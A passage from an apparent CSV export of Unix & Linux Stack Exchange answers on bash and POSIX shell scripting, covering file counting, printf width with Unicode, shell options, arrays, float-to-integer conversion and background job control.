<li>Enumerating the file names in the directory. This is inescapable: there is no way to count the files in a directory without enumerating them.</li>
<li>Sorting the file names. Shell wildcards and the <code>ls</code> command do that.</li>
<li>Calling <a href=""http://en.wikipedia.org/wiki/Stat_(system_call)"" rel=""noreferrer""><code>stat</code></a> to retrieve metadata about each directory entry, such as whether it is a directory.</li>
</ol>

<p>#3 is the most expensive by far, because it requires loading an inode for each file. In comparison all the file names needed for #1 are compactly stored in a few blocks. #2 wastes some CPU time but it is often not a deal breaker.</p>

<p>If there are no newlines in file names, a simple <code>ls -A | wc -l</code> tells you how many files there are in the directory. Beware that if you have an alias for <code>ls</code>, this may trigger a call to <code>stat</code> (e.g. <code>ls --color</code> or <code>ls -F</code> need to know the file type, which requires a call to <code>stat</code>), so from the command line, call <code>command ls -A | wc -l</code> or <code>\ls -A | wc -l</code> to avoid an alias.</p>

<p>If there are newlines in the file name, whether newlines are listed or not depends on the Unix variant. GNU coreutils and BusyBox default to displaying <code>?</code> for a newline, so they're safe.</p>

<p>Call <code>ls -f</code> to list the entries without sorting them (#2). This automatically turns on <code>-a</code> (at least on modern systems). The <code>-f</code> option is in POSIX but with optional status; most implementations support it, but not BusyBox. The option <code>-q</code> replaces non-printable characters including newlines by <code>?</code>; it's POSIX but isn't supported by BusyBox, so omit it if you need BusyBox support at the expense of overcounting files whose name contains a newline character.</p>

<p>If the directory has no subdirectories, then most versions of <code>find</code> will not call <code>stat</code> on its entries (leaf directory optimization: a directory that has a link count of 2 cannot have subdirectories, so <code>find</code> doesn't need to look up the metadata of the entries unless a condition such as <code>-type</code> requires it). So <code>find . | wc -l</code> is a portable, fast way to count files in a directory provided that the directory has no subdirectories and that no file name contains a newline.</p>

<p>If the directory has no subdirectories but file names may contain newlines, try one of these (the second one should be faster if it's supported, but may not be noticeably so).</p>

<pre><code>find -print0 | tr -dc \\0 | wc -c
find -printf a | wc -c
</code></pre>

<p>On the other hand, don't use <code>find</code> if the directory has subdirectories: even <code>find . -maxdepth 1</code> calls <code>stat</code> on every entry (at least with GNU find and BusyBox find). You avoid sorting (#2) but you pay the price of an inode lookup (#3) which kills performance.</p>

<p>In the shell without external tools, you can run count the files in the current directory with <code>set -- *; echo $#</code>. This misses dot files (files whose name begins with <code>.</code>) and reports 1 instead of 0 in an empty directory. This is the fastest way to count files in small directories because it doesn't require starting an external program, but (except in zsh) wastes time for larger directories due to the sorting step (#2).</p>

<ul>
<li><p>In bash, this is a reliable way to count the files in the current directory:</p>

<pre><code>shopt -s dotglob nullglob
a=(*)
echo ${#a[@]}
</code></pre></li>
<li><p>In ksh93, this is a reliable way to count the files in the current directory:</p>

<pre><code>FIGNORE='@(.|..)'
a=(~(N)*)
echo ${#a[@]}
</code></pre></li>
<li><p>In zsh, this is a reliable way to count the files in the current directory:</p>

<pre><code>a=(*(DNoN))
echo $#a
</code></pre>

<p>If you have the <code>mark_dirs</code> option set, make sure to turn it off: <code>a=(*(DNoN^M))</code>.</p></li>
<li><p>In any POSIX shell, this is a reliable way to count the files in the current directory:</p>

<pre><code>total=0
set -- *
if [ $# -ne 1 ] || [ -e ""$1"" ] || [ -L ""$1"" ]; then total=$((total+$#)); fi
set -- .[!.]*
if [ $# -ne 1 ] || [ -e ""$1"" ] || [ -L ""$1"" ]; then total=$((total+$#)); fi
set -- ..?*
if [ $# -ne 1 ] || [ -e ""$1"" ] || [ -L ""$1"" ]; then total=$((total+$#)); fi
echo ""$total""
</code></pre></li>
</ul>

<p>All of these methods sort the file names, except for the zsh one.</p>
"
"Why is printf ""shrinking"" umlaut?","350240","<bash><unicode><printf>","58","<p><a href=""http://pubs.opengroup.org/onlinepubs/9699919799/basedefs/V1_chap05.html#tag_05"" rel=""nofollow noreferrer"">POSIX <em>requires</em> <code>printf</code>'s <code>%-20s</code> to count those 20 in terms of <em>bytes</em></a> not <em>characters</em> even though that makes little sense as <code>printf</code> is to print <em>text</em>, formatted (see discussion <a href=""http://article.gmane.org/gmane.comp.standards.posix.austin.general/10048"" rel=""nofollow noreferrer"">at the Austin Group</a> (POSIX) and <a href=""https://lists.gnu.org/archive/html/bug-bash/2014-04/msg00017.html"" rel=""nofollow noreferrer""><code>bash</code></a> mailing lists).</p>
<p>The <code>printf</code> builtin of <code>bash</code> and most other POSIX shells honour that.</p>
<p><code>zsh</code> ignores that silly requirement (even in <code>sh</code> emulation) so <code>printf</code> works as you'd expect there. Same for the <code>printf</code> builtin of <code>fish</code> (not a POSIX-like shell).</p>
<p>The <code>ü</code> character (U+00FC), when encoded in UTF-8 is made of two bytes (0xc3 and 0xbc), which explains the discrepancy.</p>
<pre><code>$ printf %s 'Früchte und Gemüse' | wc -mcL
    18      20      18
</code></pre>
<p>That string is made of 18 characters, is 18 columns wide (<code>-L</code> being a GNU <code>wc</code> extension to report the display width of the widest line in the input) but is encoded on 20 bytes.</p>
<p>In <code>zsh</code> or <code>fish</code>, the text would be aligned correctly.</p>
<p>Now, there are also characters that have 0-width (like combining characters such as U+0308, the combining diaresis) or have double-width like in many Asiatic scripts (not to mention control characters like Tab) and even <code>zsh</code> wouldn't align those properly.</p>
<p>Example, in <code>zsh</code>:</p>
<pre><code>$ printf '%3s|\n' u ü $'u\u308' $'\u1100'
  u|
  ü|
 ü|
  ᄀ|
</code></pre>
<p>In <code>bash</code>:</p>
<pre><code>$ printf '%3s|\n' u ü $'u\u308' $'\u1100'
  u|
 ü|
ü|
ᄀ|
</code></pre>
<p><code>ksh93</code> has a <code>%Ls</code> format specification to count the width in terms of <em>display</em> width.</p>
<pre><code>$ printf '%3Ls|\n' u ü $'u\u308' $'\u1100'
  u|
  ü|
  ü|
 ᄀ|
</code></pre>
<p>That still <em>doesn't work</em> if the text contains control characters like TAB (how could it? <code>printf</code> would have to know how far apart the tab stops are in the output device and what position it starts printing at). It does work by accident with backspace characters (like in the <code>roff</code> output where <strong><code>X</code></strong> (bold <code>X</code>) is written as <code>X\bX</code>) though as <code>ksh93</code> considers all control characters as having a width of <code>-1</code>.</p>
<h2>Other options</h2>
<p>In <code>zsh</code>, you can use its padding parameter expansion flags (<code>l</code> for left-padding, <code>r</code> for right-padding), which when combined with the <code>m</code> flag considers the display width of characters (as opposed to the number of characters in the string):</p>
<pre><code>$ () { printf '%s|\n' &quot;${(ml[3])@}&quot;; } u ü $'u\u308' $'\u1100'
  u|
  ü|
  ü|
 ᄀ|
</code></pre>
<p>With <code>expand</code>:</p>
<pre><code>printf '%s\t|\n' u ü $'u\u308' $'\u1100' | expand -t3
</code></pre>
<p>That works with some <code>expand</code> implementations (not GNU's though).</p>
<p>On GNU systems, you could use GNU <code>awk</code> whose <code>printf</code> counts in chars (not bytes, not display-widths, so still not OK for the 0-width or 2-width characters, but OK for your sample):</p>
<pre><code>gawk 'BEGIN {for (i = 1; i &lt; ARGC; i++) printf &quot;%-3s|\n&quot;, ARGV[i]}
     ' u ü $'u\u308' $'\u1100'
</code></pre>
<p>If the output goes to a terminal, you can also use cursor positioning escape sequences. Like:</p>
<pre><code>forward21=$(tput cuf 21)
printf '%s\r%s%s\n' \
  &quot;Früchte und Gemüse&quot;    &quot;$forward21&quot; &quot;foo&quot; \
  &quot;Milchprodukte&quot;         &quot;$forward21&quot; &quot;bar&quot; \
  &quot;12345678901234567890&quot;  &quot;$forward21&quot; &quot;baz&quot;
</code></pre>
"
"What do the bash-builtins 'set' and 'export' do?","71144","<bash><shell>","58","<p><code>export</code> exports to children of the current process, by default they are not exported. For example:</p>

<pre><code>$ foo=bar
$ echo ""$foo""
bar
$ bash -c 'echo ""$foo""'

$ export foo
$ bash -c 'echo ""$foo""'
bar
</code></pre>

<p><code>set</code>, on the other hand, sets shell attributes, for example, the positional parameters.</p>

<pre><code>$ set foo=baz
$ echo ""$1""
foo=baz
</code></pre>

<p>Note that <code>baz</code> is not assigned to <code>foo</code>, it simply becomes a literal positional parameter. There are many other things <code>set</code> can do (mostly shell options), see <code>help set</code>.</p>

<p>As for printing, <code>export</code> called with no arguments prints all of the variables in the shell's environment. <code>set</code> also prints variables that are <em>not</em> exported. It can also export some other objects (although you should note that this is not portable), see <code>help export</code>.</p>
"
"How can I remove an element from an array completely?","68322","<bash><shell><shell-script><array>","58","<p>Just use array syntax on the assignment and quote your variable:</p>

<pre><code>array=(""${array[@]:1}"") #removed the 1st element
</code></pre>

<p><strong>Edit</strong> according to question in comment. For <code>$@</code> you can use it like this:</p>

<pre><code>set -- ""${@:2}"" #removed the 1st parameter
</code></pre>
"
"How to convert floating point number to integer?","89712","<bash><numeric-data><floating-point>","58","<h2>bash</h2>

<p>In <code>bash</code>, that's probably as good as it gets. That uses a shell builtin. If you need the result in a variable, you could use command substitution, or the <code>bash</code> specific (though now also supported by <code>zsh</code>):</p>

<pre><code>printf -v int %.0f ""$float""
</code></pre>

<p>You could do:</p>

<pre><code>float=1.23
int=${float%.*}
</code></pre>

<p>But that would remove the fractional part instead of giving you the nearest integer and that wouldn't work for values of <code>$float</code> like <code>1.2e9</code> or <code>.12</code> for instance.</p>

<p>Also note the possible limitations due to the internal representation of floats:</p>

<pre><code>$ printf '%.0f\n' 1e50
100000000000000007629769841091887003294964970946560
</code></pre>

<p>You do get an integer, but chances are that you won't be able to use that integer anywhere.</p>

<p>Also, as noted by @BinaryZebra, in several <code>printf</code> implementations (bash, ksh93, yash, not GNU, zsh, dash), it is affected by the locale (the decimal separator which can be <code>.</code> or <code>,</code>).</p>

<p>So, if your floats are always expressed with the period as the decimal separator and you want it to be treated as such by <code>printf</code> regardless of the locale of the user invoking your script, you'd need to fix the locale to C:</p>

<pre><code>LC_ALL=C printf '%.0f' ""$float""
</code></pre>

<p>With <code>yash</code>, you can also do:</p>

<pre><code>printf '%.0f' ""$(($float))""
</code></pre>

<p>(see below).</p>

<h2>POSIX</h2>

<pre><code>printf ""%.0f\n"" 1.1
</code></pre>

<p>is not POSIX as <code>%f</code> is not required to be supported by POSIX.</p>

<p>POSIXly, you can do:</p>

<pre><code>f2i() {
  awk 'BEGIN{for (i=1; i&lt;ARGC;i++)
   printf ""%.0f\n"", ARGV[i]}' ""$@""
}
</code></pre>

<p>That one is not affected by the locale (the comma cannot be a decimal separator in <code>awk</code> since it's already a special character in the syntax there (<code>print 1,2</code>, same as <code>print 1, 2</code> to pass two arguments to <code>print</code>)</p>

<h2>zsh</h2>

<p>In <code>zsh</code> (which supports floating point arithmetic (decimal separator is always the period)), you have the <code>rint()</code> math function to give you the nearest integer as a float (like in <code>C</code>) and <code>int()</code> to give you an integer from a float (like in <code>awk</code>). So you can do:</p>

<pre><code>$ zmodload zsh/mathfunc
$ i=$((int(rint(1.234e2))))
$ echo $i
123
</code></pre>

<p>Or:</p>

<pre><code>$ integer i=$((rint(5.678e2)))
$ echo $i
568
</code></pre>

<p>However note that while <code>double</code>s can represent very large numbers, integers are much more limited.</p>

<pre><code>$ printf '%.0f\n' 1e123
999999999999999977709969731404129670057984297594921577392083322662491290889839886077866558841507631684757522070951350501376
$ echo $((int(1e123)))
-9223372036854775808
</code></pre>

<h2>ksh93</h2>

<p>ksh93 was the first Bourne-like shell to support floating point arithmetic. ksh93 optimises command substitution by not using a pipe or forking when the commands are only builtin commands. So</p>

<pre><code>i=$(printf '%.0f' ""$f"")
</code></pre>

<p>doesn't fork. Or even better:</p>

<pre><code>i=${ printf '%.0f' ""$f""; }
</code></pre>

<p>which doesn't fork either but also doesn't go all the trouble of creating a fake subshell environment.</p>

<p>You can also do:</p>

<pre><code>i=$((rint(f)))
</code></pre>

<p>But beware of:</p>

<pre><code>$ echo ""$((rint(1e18)))""
1000000000000000000
$ echo ""$((rint(1e19)))""
1e+19
</code></pre>

<p>You could also do:</p>

<pre><code>integer i=$((rint(f)))
</code></pre>

<p>But like for <code>zsh</code>:</p>

<pre><code>$ integer i=1e18
$ echo ""$i""
1000000000000000000
$ integer i=1e19
$ echo ""$i""
-9223372036854775808
</code></pre>

<p>Beware that <code>ksh93</code> floating point arithmetic honour the decimal separator setting in the locale (even though <code>,</code> is otherwise a math operator (<code>$((1,2))</code> would be 6/5 in a French/German... locale, and the same as <code>$((1, 2))</code>, that is 2 in an English locale).</p>

<h2>yash</h2>

<p>yash also supports floating point arithmetic but doesn't have math functions like <code>ksh93</code>/<code>zsh</code>'s <code>rint()</code>. You can convert a number to integer though by using the <em>binary or</em> operator for instance (also works in <code>zsh</code> but not in <code>ksh93</code>). Note however that it truncates the decimal part, it doesn't give you the nearest integer:</p>

<pre><code>$ echo ""$((0.237e2 | 0))""
23
$ echo ""$((1e19 | 0))""
-9223372036854775808
</code></pre>

<p><code>yash</code> honours the locale's decimal separator on output, but not for the floating point literal constants in its arithmetic expressions, which can cause surprises:</p>

<pre><code>$ LC_ALL=fr_FR.UTF-8 ./yash -c 'a=$((1e-2)); echo $(($a + 1))'
./yash: arithmetic: `,' is not a valid number or operator
</code></pre>

<p>It's good in a way in that you can use floating point constants in your scripts that use the period and not have to worry that it will stop working in other locales, but still be able to deal with the numbers as expressed by the user as long as you remember to do:</p>

<pre><code>var=$((10.3)) # and not var=10.3
... ""$((a + 0.1))"" # and not ""$(($a + 0.1))"".

printf '%.0f\n' ""$((10.3))"" # and not printf '%.0f\n' 10.3
</code></pre>
"
"Run multiple commands and kill them as one in bash","204480","<bash><command-line><process><background-process><process-groups>","58","<p>To run commands concurrently you can use the <code>&amp;</code> command separator.</p>

<pre><code>~$ command1 &amp; command2 &amp; command3
</code></pre>

<p>This will start <code>command1</code>, then runs it in the background. The same with <code>command2</code>. Then it starts <code>command3</code> normally.</p>

<p>The output of all commands will be garbled together, but if that is not a problem for you, that would be the solution.</p>

<p>If you want to have a separate look at the output later, you can pipe the output of each command into <code>tee</code>, which lets you specify a file to mirror the output to.</p>

<pre><code>~$ command1 | tee 1.log &amp; command2 | tee 2.log &amp; command3 | tee 3.log
</code></pre>

<p>The output will probably be very messy. To counter that, you could give the output of every command a prefix using <code>sed</code>.</p>

<pre><code>~$ echo 'Output of command 1' | sed -e 's/^/[Command1] /' 
[Command1] Output of command 1
</code></pre>

<p>So if we put all of that together we get:</p>

<pre><code>~$ command1 | tee 1.log | sed -e 's/^/[Command1] /' &amp; command2 | tee 2.log | sed -e 's/^/[Command2] /' &amp; command3 | tee 3.log | sed -e 's/^/[Command3] /'
[Command1] Starting command1
[Command2] Starting command2
[Command1] Finished
[Command3] Starting command3
</code></pre>

<p>This is a highly idealized version of what you are probably going to see. But its the best I can think of right now.</p>

<p>If you want to stop all of them at once, you can use the build in <code>trap</code>.</p>

<pre><code>~$ trap 'kill %1; kill %2' SIGINT
~$ command1 &amp; command2 &amp; command3
</code></pre>

<p>This will execute <code>command1</code> and <code>command2</code> in the background and <code>command3</code> in the foreground, which lets you kill it with <kbd>Ctrl</kbd>+<kbd>C</kbd>.  </p>

<p>When you kill the last process with <kbd>Ctrl</kbd>+<kbd>C</kbd> the <code>kill %1; kill %2</code> commands are executed, because we connected their execution with the reception of an INTerupt SIGnal, the thing sent by pressing <kbd>Ctrl</kbd>+<kbd>C</kbd>. </p>

<p>They respectively kill the 1st and 2nd background process (your <code>command1</code> and <code>command2</code>). Don't forget to remove the trap, after you're finished with your commands using <code>trap - SIGINT</code>.</p>

<p>Complete monster of a command:</p>

<pre><code>~$ trap 'kill %1; kill %2' SIGINT
~$ command1 | tee 1.log | sed -e 's/^/[Command1] /' &amp; command2 | tee 2.log | sed -e 's/^/[Command2] /' &amp; command3 | tee 3.log | sed -e 's/^/[Command3] /'
</code></pre>

<hr>

<p>You could, of course, have a look at <a href=""https://kb.iu.edu/d/acuy"">screen</a>. It lets you split your console into as many separate consoles as you want. So you can monitor all commands separately, but at the same time.</p>
"
"Bash: How to read one line at a time from output of a command?","52026","<bash><shell><find><pipe>","57","<p>There's a mistake, you need <code>&lt; &lt;(command)</code> not <code>&lt;&lt;&lt;$(command)</code></p>

<p><code>&lt; &lt;( )</code> is a <a href=""http://mywiki.wooledge.org/ProcessSubstitution"">Process Substitution</a>, <code>$()</code> is a <a href=""http://pubs.opengroup.org/onlinepubs/9699919799/utilities/V3_chap02.html#tag_18_06_03"">command substitution</a> and <code>&lt;&lt;&lt;</code> is a <em>here-string</em>. </p>
"
"unix, difference between path starting with '/' and '//'","12283","<linux><bash><filenames><slash>","57","<p>For the most part, <a href=""https://unix.stackexchange.com/q/1910"">repeated slahes in a path are equivalent to a single slash</a>. This behavior is mandated by POSIX and most applications follow suit. The exception is that “a pathname that begins with two successive slashes may be interpreted in an implementation-defined manner” (but <code>///foo</code> is equivalent to <code>/foo</code>).</p>

<p>Most unices don't do anything special with two initial slashes. Linux, in particular, doesn't. Cygwin does: <code>//hostname/path</code> accesses a network drive (SMB).</p>

<p>What you're seeing is not, in fact, Linux doing anything special with <code>//</code>: it's bash's current directory tracking. Compare:</p>

<pre><code>$ bash -c 'cd //; pwd'
//
$ bash -c 'cd //; /bin/pwd'
/
</code></pre>

<p>Bash is taking the precaution that the OS might be treating <code>//</code> specially and keeping it. Dash does the same. Ksh and zsh don't when they're running on Linux, I guess (I haven't checked) they have a compile-time setting.</p>
"
"Duplicate entries in $PATH a problem?","14895","<bash><path>","57","<p>Having more entries in <code>$PATH</code> doesn't directly slow your startup, but it does slow each time you first run a particular command in a shell session (not every time you run the command, because bash maintains a cache). The slowdown is rarely perceptible unless you have a particularly slow filesystem (e.g. NFS, Samba or other network filesystem, or on Cygwin).</p>

<p>Duplicate entries are also a little annoying when you review your <code>$PATH</code> visually, you have to wade through more cruft.</p>

<p>It's easy enough to avoid adding duplicate entries.</p>

<pre><code>case "":$PATH:"" in
  *"":$new_entry:""*) :;; # already there
  *) PATH=""$new_entry:$PATH"";; # or PATH=""$PATH:$new_entry""
esac
</code></pre>

<p>Side note: sourcing someone else's shell script means executing code that he's written. In other words, you're giving your friends access to your account whenever they want.</p>

<p>Side note: <code>.bashrc</code> is not the right place to set <code>$PATH</code> or any other environment variable. Environment variables should be set in <code>~/.profile</code>. See <a href=""https://superuser.com/questions/183845/which-setup-files-should-be-used-for-setting-up-environment-variables-with-bash/183956"">Which setup files should be used for setting up environment variables with bash?</a>, <a href=""https://superuser.com/questions/183870/difference-between-bashrc-and-bash-profile/183980"">Difference between .bashrc and .bash_profile</a>.</p>
"
"Assigning exit code to a shell local variable","207957","<bash><shell><variable><command-substitution>","57","<p><code>local t1=$(exit 1)</code> tells the shell to:</p>

<ul>
<li>run <code>exit 1</code> in a subshell;</li>
<li>store its output (as in, the text it outputs to standard output) in a variable <code>t1</code>, local to the function.</li>
</ul>

<p>It's thus normal that <code>t1</code> ends up being empty.</p>

<p>(<code>$()</code> is known as <a href=""https://www.gnu.org/software/bash/manual/html_node/Command-Substitution.html"">command substitution</a>.)</p>

<p>The exit code is always assigned to <code>$?</code>, so you can do</p>

<pre><code>function0()
{
  (exit 1)
  echo ""$?""
}
</code></pre>

<p>to get the effect you're looking for. You can of course assign <code>$?</code> to another variable:</p>

<pre><code>function0()
{
  (exit 1)
  local t1=$?
  echo ""$t1""
}
</code></pre>
"
"How to restore the value of shell options like `set -x`?","310957","<bash><shell>","57","<h1>Abstract</h1>
<p>To reverse a <code>set -x</code> just execute a <code>set +x</code>. Most of the time, the reverse of an string <code>set -str</code> is the same string with a <code>+</code>: <code>set +str</code>.</p>
<p>In general, to restore all (read below about bash <code>errexit</code>) shell options (changed with <code>set</code> command) you could do (also read below about bash <code>shopt</code> options):</p>
<pre><code>oldstate=&quot;$(set +o)&quot;                # POSIXly store all set options.
.
.
set -vx; eval &quot;$oldstate&quot;         # restore all options stored.
</code></pre>
<p>Should be enough, but bash has two groups of options accessed via <code>set</code> (or <code>shopt -po</code>) and some others accessed via <code>shopt -p</code>. Also, bash doesn't preserve <code>set -e</code> (errexit) on entering subshells. Note that the list of options that results from expanding <code>$-</code> might not be valid to re-enter in a shell.</p>
<p>To capture the whole present state (in bash) use:</p>
<pre><code>oldstate=&quot;$(shopt -po; shopt -p)&quot;; [[ -o errexit ]] &amp;&amp; oldstate=&quot;$oldstate; set -e&quot;
</code></pre>
<p>Or, if you don't mind setting the <code>inherit_errexit</code> flag (and your bash is ≥4.4):</p>
<pre><code>shopt -s inherit_errexit;    oldstate=&quot;$(shopt -po; shopt -p)&quot;
</code></pre>
<hr />
<h1>Longer Description</h1>
<h1>bash</h1>
<p>This command:</p>
<pre><code>shopt -po xtrace
</code></pre>
<p>is used to generate an executable string that reflects the state of the option(s).
The <code>p</code> flag means print, and the <code>o</code> flag specifies that we are asking about option(s) set by the <code>set</code> command (as opposed to option(s) set <strong>only</strong> by the <code>shopt</code> command).
You can assign this string to a variable, and execute the variable at the end of your script to restore the initial state.</p>
<pre><code># store state of xtrace option.
tracestate=&quot;$(shopt -po xtrace)&quot;

# change xtrace as needed
echo &quot;some commands with xtrace as externally selected&quot;
set -x
echo &quot;some commands with xtrace set&quot;

# restore the value of xtrace to its original value.
eval &quot;$tracestate&quot;
</code></pre>
<hr />
<p>This solution also works for multiple options simultaneously:</p>
<pre><code>oldstate=&quot;$(shopt -po xtrace noglob errexit)&quot;

# change options as needed
set -x
set +x
set -f
set -e
set -x

# restore to recorded state:
set +vx; eval &quot;$oldstate&quot;
</code></pre>
<p>Adding <code>set +vx</code> avoids the printing of a long list of options.</p>
<hr />
<p>If you don’t list any option names,</p>
<pre><code>oldstate=&quot;$(shopt -po)&quot;
</code></pre>
<p>it gives you the values of all (set) options.
And, if you leave out the <code>o</code> flag,
you can do the same things with <code>shopt</code> options:</p>
<pre><code># store state of dotglob option.
dglobstate=&quot;$(shopt -p dotglob)&quot;

# store state of all options.
oldstate=&quot;$(shopt -p)&quot;
</code></pre>
<hr />
<p>If you need to test whether a <code>set</code> option is set,
the most idiomatic (Bash) way to do it is:</p>
<pre><code>[[ -o xtrace ]]
</code></pre>
<p>which is better than the other two similar tests:</p>
<ol>
<li><code>[[ $- =~ x ]]</code></li>
<li><code>[[ $- == *x* ]]</code></li>
</ol>
<p>With any of the tests, this works:</p>
<pre><code># record the state of the xtrace option in ts (tracestate):
[ -o xtrace ] &amp;&amp; ts='set -x' || ts='set +x'

# change xtrace as needed
echo &quot;some commands with xtrace as externally selected&quot;
set -x
echo &quot;some commands with xtrace set&quot;

# set the xtrace option back to what it was.
eval &quot;$ts&quot;
</code></pre>
<hr />
<p>Here’s how to test the state of a <code>shopt</code> option:</p>
<pre><code>if shopt -q dotglob
then
        # dotglob is set, so “echo .* *” would list the dot files twice.
        echo *
else
        # dotglob is not set.  Warning: the below will list “.” and “..”.
        echo .* *
fi
</code></pre>
<hr />
<h1>POSIX</h1>
<p>A simple, POSIX-compliant solution to store all <code>set</code> options is:</p>
<pre><code>set +o
</code></pre>
<p>which is <a href=""http://pubs.opengroup.org/onlinepubs/9699919799/utilities/V3_chap02.html#set"" rel=""nofollow noreferrer"">described in the POSIX standard</a> as:</p>
<blockquote>
<p><strong>+o</strong><ul>
Write the current option settings to standard output in a format
that is suitable for reinput to the shell
as commands that achieve the same options settings.</ul></p>
</blockquote>
<p>So, simply:</p>
<pre><code>oldstate=$(set +o)
</code></pre>
<p>will preserve values for all options set using the <code>set</code> command (in some shells).</p>
<p>Again, restoring the options to their original values is a matter of executing the variable:</p>
<pre><code>set +vx; eval &quot;$oldstate&quot;
</code></pre>
<p>This is exactly equivalent to using Bash's <code>shopt -po</code>. Note that it will <em>not</em> cover <em>all</em> possible <em>Bash</em> options, as some of those are set (only) by <code>shopt</code>.</p>
<h3>bash special case</h3>
<p>There are many other shell options listed with <code>shopt</code> in bash:</p>
<pre><code>$ shopt
autocd          off
cdable_vars     off
cdspell         off
checkhash       off
checkjobs       off
checkwinsize    on
cmdhist         on
compat31        off
compat32        off
compat40        off
compat41        off
compat42        off
compat43        off
complete_fullquote  on
direxpand       off
dirspell        off
dotglob         off
execfail        off
expand_aliases  on
extdebug        off
extglob         off
extquote        on
failglob        off
force_fignore   on
globasciiranges off
globstar        on
gnu_errfmt      off
histappend      on
histreedit      off
histverify      on
hostcomplete    on
huponexit       off
inherit_errexit off
interactive_comments    on
lastpipe        on
lithist         off
login_shell     off
mailwarn        off
no_empty_cmd_completion off
nocaseglob      off
nocasematch     off
nullglob        off
progcomp        on
promptvars      on
restricted_shell    off
shift_verbose   off
sourcepath      on
xpg_echo        off
</code></pre>
<p>Those could be appended to the variable set above and restored in the same way:</p>
<pre><code>$ oldstate=&quot;$oldstate;$(shopt -p)&quot;
.
.                                   # change options as needed.
.
$ eval &quot;$oldstate&quot; 
</code></pre>
<h3>bash's <code>set -e</code> special case</h3>
<p>In bash, the value of <code>set -e</code> (<code>errexit</code>) is reset inside sub-shells, that makes it difficult to capture its value with <code>set +o</code> inside a $(…) sub-shell.</p>
<p>As a workaround, use:</p>
<pre><code>oldstate=&quot;$(set +o)&quot;; [[ -o errexit ]] &amp;&amp; oldstate=&quot;$oldstate; set -e&quot;
</code></pre>
<p>Or (if it doesn't contradict your goals and your bash supports it) you can use the <code>inherit_errexit</code> option.</p>
<hr />
<p><strong>Note</strong>: each shell has a slightly different way to build the list of options that are set or unset (not to mention different options that are defined), so the strings are not portable between shells, but are valid for the same shell.</p>
<h3>zsh special case</h3>
<p><code>zsh</code> also works correctly (following POSIX) since version 5.3. In previous versions it followed POSIX only partially with <code>set +o</code> in that it printed options in a format that was suitable for reinput to the shell as commands, but only for <em>set</em> options (it didn't print <em>un-set</em> options).</p>
<h3>mksh special case</h3>
<p>The mksh (and by consequence lksh) is not yet (MIRBSD KSH R54 2016/11/11) able to do this. The mksh manual contains this:</p>
<blockquote>
<p>In a future version, set +o will behave POSIX compliant and print commands to restore the current options instead.</p>
</blockquote>
"
"Why is bash's prompt variable called PS1?","32096","<bash><command-line>","57","<p>PS1 stands for ""Prompt String One"" or ""Prompt Statement One"", the first prompt string (that you see at a command line).</p>

<p>Yes, there is a PS2 and more! Please read <a href=""http://www.thegeekstuff.com/2008/09/bash-shell-take-control-of-ps1-ps2-ps3-ps4-and-prompt_command/"">this</a> article and the Arch <a href=""https://wiki.archlinux.org/index.php/Color_Bash_Prompt"">wiki</a> and of course <a href=""http://www.gnu.org/software/bash/manual/bashref.html"">The Bash Reference Manual</a>.</p>
"
"How can I read line by line from a variable in bash?","9784","<bash><shell><io><cat>","57","<p>You can use a while loop with process substitution:</p>

<pre><code>while read -r line
do
    echo ""$line""
done &lt; &lt;(jobs)
</code></pre>

<p>An optimal way to read a multiline variable is to set a blank <code>IFS</code> variable and <code>printf</code> the variable in with a trailing newline:</p>

<pre><code># Printf '%s\n' ""$var"" is necessary because printf '%s' ""$var"" on a
# variable that doesn't end with a newline then the while loop will
# completely miss the last line of the variable.
while IFS= read -r line
do
   echo ""$line""
done &lt; &lt;(printf '%s\n' ""$var"")
</code></pre>

<p>Note: As per <a href=""https://github.com/koalaman/shellcheck/wiki/SC2031"" rel=""noreferrer"">shellcheck sc2031</a>, the use of process substition is preferable to a pipe to avoid [subtly] creating an subshell.</p>

<p>Also, please realize that by naming the variable <code>jobs</code> it may cause confusion since that is also the name of a common shell command.</p>
"
"Joining bash arguments into single string with spaces","197792","<bash><shell-script>","57","<p>I believe that this does what you want.  It will put all the arguments in one string, separated by spaces, with single quotes around all:</p>

<pre><code>str=""'$*'""
</code></pre>

<p><code>$*</code> produces all the scripts arguments separated by the first character of <code>$IFS</code> which, by default, is a space.</p>

<p>Inside a double quoted string, there is no need to escape single-quotes.</p>

<h3>Example</h3>

<p>Let us put the above in a script file:</p>

<pre><code>$ cat script.sh 
#!/bin/sh
str=""'$*'""
echo ""$str""
</code></pre>

<p>Now, run the script with sample arguments:</p>

<pre><code>$ sh script.sh one two three four 5
'one two three four 5'
</code></pre>

<p>This script is POSIX.  It will work with <code>bash</code> but it does not require <code>bash</code>.</p>

<h3>A variation: concatenating with slashes instead of spaces</h3>

<p>We can change from spaces to another character by adjusting <code>IFS</code>:</p>

<pre><code>$ cat script.sh 
#!/bin/sh
old=""$IFS""
IFS='/'
str=""'$*'""
echo ""$str""
IFS=$old
</code></pre>

<p>For example:</p>

<pre><code>$ sh script.sh one two three four       
'one/two/three/four'
</code></pre>
"
"Output from ls has newlines but displays on a single line. Why?","10421","<bash><terminal><ls><od>","57","<p>When you pipe the output, <code>ls</code> acts differently.</p>

<p>This fact is hidden away in the <a href=""http://www.gnu.org/software/coreutils/manual/html_node/ls-invocation.html#ls-invocation"" rel=""noreferrer"">info documentation</a>:</p>

<blockquote>
  <p>If standard output is a terminal, the output is in columns (sorted vertically) and control characters are output as question marks; otherwise, the output is listed one per line and control characters are output as-is.</p>
</blockquote>

<p>To prove it, try running</p>

<pre><code>ls
</code></pre>

<p>and then</p>

<pre><code>ls | less
</code></pre>

<p>This means that if you want the output to be guaranteed to be one file per line, regardless of whether it is being piped or redirected, you have to run</p>

<pre><code>ls -1
</code></pre>

<p>(<code>-1</code> is the number one)</p>

<p>Or, you can force <code>ls | less</code> to output in columns by running</p>

<pre><code>ls -C
</code></pre>

<p>(<code>-C</code> is a capital C)</p>
"
"Bash script to get ASCII values for alphabet","92447","<bash><bash-script><ascii>","56","<p>Define these two functions (usually available in other languages):</p>

<pre><code>chr() {
  [ ""$1"" -lt 256 ] || return 1
  printf ""\\$(printf '%03o' ""$1"")""
}

ord() {
  LC_CTYPE=C printf '%d' ""'$1""
}
</code></pre>

<p>Usage:</p>

<pre><code>chr 65
A

ord A
65
</code></pre>
"
"Dashes in printf","22764","<bash><printf>","56","<p>The <code>--</code> is used to tell the program that whatever follows should <strong>not</strong> be interpreted as a command line <em>option</em> to <code>printf</code>.</p>

<p>Thus the <code>printf ""--""</code> you tried basically ended up as <em>""<code>printf</code> with no arguments""</em> and therefore failed.</p>
"
"How do you list number of lines of every file in a directory in human readable format.","260630","<bash><awk><python><perl>","56","<blockquote>
